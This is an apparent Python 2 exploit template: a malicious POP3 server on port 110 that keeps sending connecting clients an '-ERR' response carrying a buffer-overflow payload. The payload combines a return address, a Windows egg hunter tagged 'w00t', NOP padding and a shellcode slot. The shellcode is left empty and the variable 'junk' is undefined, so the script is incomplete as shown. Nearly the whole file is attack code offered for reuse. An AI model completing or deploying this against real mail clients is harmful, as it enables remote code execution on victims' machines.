#!/usr/bin/python

# Template for TCP server attacks.
# Egg hunter example included.

import socket
import struct

# Our local server - adjust accordingly
local_server = '192.168.1.15'

# Pack the address in little-endian - adjust name accordingly
ret = struct.pack('<I', 0x7E455AF7)

# Padding - adjust accordingly
padding = '\x90' * 1000

# Egg hunter example
# "\x77\x30\x30\x74" is our tag: w00t
egg_hunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + "\x77\x30\x30\x74" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Shellcode goes here
shellcode = ()

# Adjust payload structure accordingly
payload = junk + ret + egg_hunter + padding + "w00tw00t" + shellcode

try:
	# Listener on port 110 - adjust accordingly
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print "[*] Listening on TCP port 110 [POP3]..."
	print "[*] Have someone connect to this host!\n"

	connect, addr = s.accept()

	print "[*] Received connection from: ", addr
	print "[*] Sending payload...\n"

	# While loop in case application survives first wave of attacks
	while 1:
		# Sample POP3 vulnerability attack
		connect.send("-ERR" + payload + "\r\n")
	connect.close()

except:
	print "[*] Connection closed.\n"

